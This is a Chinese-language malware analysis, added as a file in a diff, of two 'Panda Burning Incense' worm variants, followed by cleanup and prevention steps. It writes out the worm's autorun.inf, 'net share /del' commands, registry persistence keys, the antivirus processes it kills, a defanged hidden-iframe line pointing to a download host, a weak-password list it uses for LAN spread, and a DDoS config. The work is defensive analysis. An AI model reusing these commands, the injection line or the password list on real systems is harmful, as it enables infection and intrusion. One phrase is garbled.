@@ -1,0 +1,340 @@
+
+study
+熊猫烧香
+
+讲解熊猫烧香病毒的原理
+熊猫烧香病毒变种一：病毒进程为“spoclsv.exe”　　这是“熊猫烧香”早期变种之一，特别之处是“杀死杀毒软件”，最恶劣之处在于感染全盘.exe文件和删除.gho文件（Ghost的镜像文件）。
+　　最有“灵感”的一招莫过于在所有htm/html/asp/php/jsp/aspx文件末尾添加一段代码来调用病毒。目前所有专杀工具及杀毒软件均不会修复此病毒行为。需要手动清除病毒添加的代码，且一定要清除。否则访问了有此代码的网页，又会感染。
+　　其他老一点的“熊猫烧香”spoclsv变种的病毒行为比此版本少。就不再单独列出。
+　　病毒描述：
+　　“武汉男生”，俗称“熊猫烧香”，这是一个感染型的蠕虫病毒，它能感染系统中exe，com，pif，src，html，asp等文件，它还能中止大量的反病毒软件进程并且会删除扩展名为gho的文件，（.gho为GHOST的备份文件），使用户的系统备份文件丢失。被感染的用户系统中所有.exe可执行文件全部被改成熊猫举着三根香的模样。
+以下是熊猫烧香病毒详细行为和解决办法：
+　　熊猫烧香病毒详细行为：
+　　1.复制自身到系统目录下：
+　　%System%\drivers\spoclsv.exe（“%System%”代表Windows所在目录，比如：C:\Windows）
+　　不同的spoclsv.exe变种，此目录可不同。比如12月爆发的变种目录是：C:\WINDOWS\System32\Drivers\spoclsv.exe。
+　　2.创建启动项：
+　　[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
+　　"svcshare"="%System%\drivers\spoclsv.exe"
+　　3.在各分区根目录生成病毒副本：
+　　X:\setup.exe
+　　X:\autorun.inf
+　　autorun.inf内容：
+　　[AutoRun]
+　　OPEN=setup.exe
+　　shellexecute=setup.exe
+　　shell\Auto\command=setup.exe
+　　4.使用net share命令关闭管理共享：
+　　cmd.exe /c net share X$ /del /y
+　　cmd.exe /c net share admin$ /del /y
+　　5.修改“显示所有文件和文件夹”设置：
+　　[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion
+　　\Explorer\Advanced\Folder\Hidden\SHOWALL]
+　　"CheckedValue"=dword:00000000
+　　6.熊猫烧香病毒尝试关闭安全软件相关窗口：
+　　天网
+　　防火墙
+　　进程
+　　VirusScan
+　　NOD32
+　　网镖
+　　杀毒
+　　毒霸
+　　瑞星
+　　江民
+　　黄山IE
+　　超级兔子
+　　优化大师
+　　木马清道夫
+　　木馬清道夫
+　　QQ病毒
+　　注册表编辑器
+　　系统配置实用程序
+　　卡巴斯基反病毒
+　　Symantec AntiVirus
+　　Duba
+　　Windows 任务管理器
+　　esteem procs
+　　绿鹰PC
+　　密码防盗
+　　噬菌体
+　　木马辅助查找器
+　　System Safety Monitor
+　　Wrapped gift Killer
+　　Winsock Expert
+　　游戏木马检测大师
+　　超级巡警
+　　msctls_statusbar32
+　　pjf(ustc)
+　　IceSword
+　　7.尝试结束安全软件相关进程以及Viking病毒（威金病毒）进程：
+　　Mcshield.exe
+　　VsTskMgr.exe
+　　naPrdMgr.exe
+　　UpdaterUI.exe
+　　TBMon.exe
+　　scan32.exe
+　　Ravmond.exe
+　　CCenter.exe
+　　RavTask.exe
+　　Rav.exe
+　　Ravmon.exe
+　　RavmonD.exe
+　　RavStub.exe
+　　KVXP.kxp
+　　KvMonXP.kxp
+　　KVCenter.kxp
+　　KVSrvXP.exe
+　　KRegEx.exe
+　　UIHost.exe
+　　TrojDie.kxp
+　　FrogAgent.exe
+　　Logo1_.exe
+　　Logo_1.exe
+　　Rundl132.exe
+　　8.禁用安全软件相关服务：
+　　Schedule
+　　sharedaccess
+　　RsCCenter
+　　RsRavMon
+　　KVWSC
+　　KVSrvXP
+　　kavsvc
+　　AVP
+　　McAfeeFramework
+　　McShield
+　　McTaskManager
+　　navapsvc
+　　wscsvc
+　　KPfwSvc
+　　SNDSrvc
+　　ccProxy
+　　ccEvtMgr
+　　ccSetMgr
+　　SPBBCSvc
+　　Symantec Core LC
+　　NPFMntor
+　　MskService
+　　FireSvc
+　　9.删除安全软件相关启动项：
+　　SOFTWARE\Microsoft\Windows\CurrentVersion\Run\RavTask
+　　SOFTWARE\Microsoft\Windows\CurrentVersion\Run\KvMonXP
+　　SOFTWARE\Microsoft\Windows\CurrentVersion\Run\kav
+　　SOFTWARE\Microsoft\Windows\CurrentVersion\Run\KAVPersonal50
+　　SOFTWARE\Microsoft\Windows\CurrentVersion\Run\McAfeeUpdaterUI
+　　SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Network Associates Error Reporting Service
+　　SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ShStatEXE
+　　SOFTWARE\Microsoft\Windows\CurrentVersion\Run\YLive.exe
+　　SOFTWARE\Microsoft\Windows\CurrentVersion\Run\yassistse
+　　10.遍历目录修改htm/html/asp/php/jsp/aspx等网页文件，在这些文件尾部追加信息：
+　　<iframe src="hxxp://www.ctv163.com/wuhan/down.htm" width="0" height="0" frameborder="0"> </iframe>
+　　但不修改以下目录中的网页文件：
+　　C:\WINDOWS
+　　C:\WINNT
+　　C:\system32
+　　C:\Documents and Settings
+　　C:\System Volume Information
+　　C:\Recycled
+　　Program Files\Windows NT
+　　Program Files\WindowsUpdate
+　　Program Files\Windows Media Player
+　　Program Files\Outlook Express
+　　Program Files\Internet Explorer
+　　Program Files\NetMeeting
+　　Program Files\Common Files
+　　Program Files\ComPlus Applications
+　　Program Files\Messenger
+　　Program Files\InstallShield Installation Information
+　　Program Files\MSN
+　　Program Files\Microsoft Frontpage
+　　Program Files\Movie Maker
+　　Program Files\MSN Gamin Zone
+　　11.在访问过的目录下生成Desktop_.ini文件，内容为当前日期。
+　　12.此外，病毒还会尝试删除GHO文件。
+　　病毒还尝试使用弱密码将副本以GameSetup.exe的文件名复制到局域网内其它计算机中：
+　　password
+　　harley
+　　golf
+　　pussy
+　　mustang
+　　shadow
+　　fish
+　　qwerty
+　　baseball
+　　letmein
+　　ccc
+　　admin
+　　abc
+　　pass
+　　passwd
+　　database
+　　abcd
+　　abc123
+　　sybase
+　　123qwe
+　　server
+　　computer
+　　super
+　　123asd
+　　ihavenopass
+　　godblessyou
+　　enable
+　　alpha
+　　1234qwer
+　　123abc
+　　aaa
+　　patrick
+　　pat
+　　administrator
+　　root
+　　sex
+　　god
+　　****you
+　　****
+　　test
+　　test123
+　　temp
+　　temp123
+　　win
+　　asdf
+　　pwd
+　　qwer
+　　yxcv
+　　zxcv
+　　home
+　　xxx
+　　owner
+　　login
+　　Login
+　　love
+　　mypc
+　　mypc123
+　　admin123
+　　mypass
+　　mypass123
+　　Administrator
+　　Guest
+　　admin
+　　Root
+　　病毒文件内含有这些信息：
+　　whboy
+　　***武*汉*男*生*感*染*下*载*者***
+解决方案：
+　　1. 结束病毒进程：
+　　%System%\drivers\spoclsv.exe
+　　不同的spoclsv.exe变种，此目录可不同。比如12月爆发的变种目录是：C:\WINDOWS\System32\Drivers\spoclsv.exe。但可用此方法清除。
+　　“%System%\system32\spoclsv.exe”是系统文件。（目前看来没有出现插入该系统进程的变种，不排除变种的手法变化。）
+　　查看当前运行spoclsv.exe的路径，可使用超级兔子魔法设置。
+　　2. 删除病毒文件：
+　　%System%\drivers\spoclsv.exe
+　　请注意区分病毒和系统文件。详见步骤1。
+　　3. 删除病毒启动项：
+　　[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
+　　"svcshare"="%System%\drivers\spoclsv.exe"
+　　4. 通过分区盘符右键菜单中的“打开”进入分区根目录，删除根目录下的病毒文件：
+　　X:\setup.exe
+　　X:\autorun.inf
+　　5. 恢复被修改的“显示所有文件和文件夹”设置：
+　　[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion
+　　\Explorer\Advanced\Folder\Hidden\SHOWALL]
+　　"CheckedValue"=dword:00000001
+　　6. 修复或重新安装被破坏的安全软件。
+　　7.修复被感染的程序。可用专杀工具进行修复，收集了四个供读者使用。金山熊猫烧香病毒专杀工具、安天熊猫烧香病毒专杀工具、江民熊猫烧香病毒专杀工具和瑞星熊猫烧香病毒专杀工具。也可用手动方法（见本文末）。
+　　8. 恢复被修改的网页文件，可以使用某些编辑网页的工具替换被添加文字为空。机器上有htm/html/asp/php/jsp/aspx等网页文件，一定要删除此段代码。有危险代码的网页一但发布到网页可能会感染其他用户。
+熊猫烧香病毒变种二：病毒进程为“****Jacks.exe”
+　　以下是数据安全实验室提供的信息与方法。
+　　病毒描述：
+　　含有病毒体的文件被运行后，病毒将自身拷贝至系统目录，同时修改注册表将自身设置为开机启动项，并遍历各个驱动器，将自身写入磁盘根目录下，增加一个Autorun.inf文件，使得用户打开该盘时激活病毒体。随后病毒体开一个线程进行本地文件感染，同时开另外一个线程连接某网站下载ddos程序进行发动恶意攻击。
+　　病毒基本情况：
+　　[文件信息]
+　　病毒名: Virus.Win32.EvilPanda.a.ex$
+　　大小: 0xDA00 (55808), (disk) 0xDA00 (55808)
+　　SHA1 : F0C3DA82E1620701AD2F0C8B531EEBEA0E8AF69D
+　　壳信息: 未知
+　　危害级别：高
+　　病毒名: Flooder.Win32.FloodBots.a.ex$
+　　大 小: 0xE800 (59392), (disk) 0xE800 (59392)
+　　SHA1 : B71A7EF22A36DBE27E3830888DAFC3B2A7D5DA0D
+　　壳信息: UPX 0.89.6 - 1.02 / 1.05 - 1.24
+　　危害级别：高
+　　病毒行为：
+　　Virus.Win32.EvilPanda.a.ex$ ：
+　　1、病毒体执行后，将自身拷贝到系统目录：
+　　%SystemRoot%\system32\****Jacks.exe
+　　
+　　2、添加注册表启动项目确保自身在系统重启动后被加载：
+　　键路径：HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+　　键名：****Jacks
+　　键值："C:WINDOWS\system32\****Jacks.exe"
+　　键路径：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+　　键名：svohost
+　　键值："C:WINDOWS\system32\****Jacks.exe"
+　　3、拷贝自身到所有驱动器根目录，命名为Setup.exe，并生成一个autorun.inf使得用户打开该盘运行病毒，并将这两个文件属性设置为隐藏、只读、系统。
+　　C:autorun.inf   1KB   RHS
+　　C:setup.exe   230KB   RHS
+　　4、关闭众多杀毒软件和安全工具。
+　　5、连接*****.3322.org下载某文件，并根据该文件记录的地址，去www.****.com下载某ddos程序，下载成功后执行该程序。
+　　6、刷新bbs.qq.com，某QQ秀链接。
+　　7、循环遍历磁盘目录，感染文件，对关键系统文件跳过，不感染Windows媒体播放器、MSN、IE 等程序。
+　　Flooder.Win32.FloodBots.a.ex$ ：
+　　1、病毒体执行后，将自身拷贝到系统目录：
+　　%SystemRoot%\SVCH0ST.EXE（注意文件名中的“0”是数字“零”，不是字母“o”）
+　　%SystemRoot%\system32\SVCH0ST.EXE（注意文件名中的“0”是数字“零”，不是字母“o”）
+　　2、该病毒后下载运行后，添加注册表启动项目确保自身在系统重启动后被加载：
+　　键路径：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+　　键名：Userinit
+　　键值："C:WINDOWS\system32\SVCH0ST.exe"
+　　3、连接ddos2.****.com，获取攻击地址列表和攻击配置，并根据配置文件，进行相应的攻击。
+　　配置文件如下：
+　　www。victim.net:3389
+　　www。victim.net:80
+　　www。victim.com:80
+　　www。victim.net:80
+　　1
+　　1
+　　120
+　　50000　　
+解决方案：
+　　1. 断开网络
+　　2. 结束病毒进程：%System%\****Jacks.exe 
+　　3. 删除病毒文件：%System%\****Jacks.exe 
+　　4. 右键点击分区盘符，点击右键菜单中的“打开”进入分区根目录，删除根目录下的文件： 
+　　X:\autorun.inf 
+　　X:\setup.exe 
+　　5. 删除病毒创建的启动项： 
+　　[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run] 
+　　"****Jacks"="%System%\****Jacks.exe" 
+　　[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] 
+　　"svohost"="%System%\****Jacks.exe" 
+　　6. 修复或重新安装反病毒软件
+　　7. 使用反病毒软件或专杀工具进行全盘扫描，清除恢复被感染的exe文件。也可用以下的手动方法恢复文件。
+　　手动恢复中毒文件（在虚拟机上通过测试，供参考）
+　　1.在清除病毒文件的同时不删除%SYSTEM%下面释放****Jacks.exe的这个文件，即执行之前的步骤1、2、4、5。
+　　2.打开“运行”输入“gpedit.msc”打开组策略－本地计算机策略－windows设置－安全设置－软件限制策略－其它规则。在其它规则上右键选择－新散列规则－打开新散列规则窗口
+　　3.在文件散列上点击浏览找到%SYSTEM%下面释放****Jacks.exe文件。安全级别选择－不允许的。确定后重启。
+　　4.重启后可以双击运行已经被熊猫感染的程序。运行程序后该****Jacks.exe文件会在注册表里的Run键下建立启动项（不会有问题的）。
+　　5.双击运行被感染的程序已经恢复原来样子了。全部回春螅肧REng把****Jacks.exe在注册表里的启动项删除即可！
+如何防止局域网传播~
+首先，让我们来了解一下“熊猫烧香”，其别名为“尼姆亚”，最早出现在2006年的11月，到目前
+为止已经有数十个不同变种 ，除了通过网站带毒感染用户之外，此病毒还会感染优盘，并会在局域网中
+传播，在极短时间之内就可以感染几千台计算机，严重时可以导致网络瘫痪。中毒电脑上会出现“熊猫烧
+香”图案，并出现蓝屏、频繁重启，以及系统硬盘中数据文件被破坏等现象，优盘上会出现3个EXE文
+件，并无法正常打开。
+
+发现熊猫烧香的方法：1、你可以拿有写保护功能的优盘，打开写保护，插在被感染电脑上，这时会
+出现spoclsv.exe(系统文件为“spoolsv.exe”只差一个字母，大家可要看清楚哦)不断写你的优盘。
+2、打开“我的电脑”→“工具”→“文件夹选项”→“查看”→把“隐藏受保护的操作系统文件”的勾
+去掉，并选择“显示所有文件和文件夹”→“确定”。这时，用右键打开各本地盘，里面都会出现
+“setup.exe”文件，图标为一只可爱的熊猫在烧香。3、ctrl+alt+del，在任务管理器里会有系统文件
+“spoclsv.exe”。
+
+防止熊猫烧香病毒感染：（1）优盘传播防止方法，由于熊猫烧香的传播性极大，只要你打开存在熊
+猫烧香病毒的优盘就会感染，所以防止感染方法只有升级你的杀毒软件到最新版本。（2）网络传播防止
+方法，熊猫烧香传播时必定会发送一个“gamesetup.exe”文件，图标就是一只可爱的熊猫在烧香，这
+时不要千万打开它，直接删除。
+
+删除熊猫烧香的方法：由于熊猫烧香会感染系统文件，本人建议使用专门的专杀工具杀毒，在杀毒期
+间拔除网线，并进入安全模式。
+同时经过测试，其他的熊猫烧香专杀对于变种似乎作用不大。而且无法修复被改变的exe文件，建议大家使用超级巡警2.7.0或者2.7.1中的熊猫烧香专杀1.6
+可以有效杀灭熊猫变种以及修复被感染的文件~
+ Copyright ©2011 lyt. All Rights Reserved.
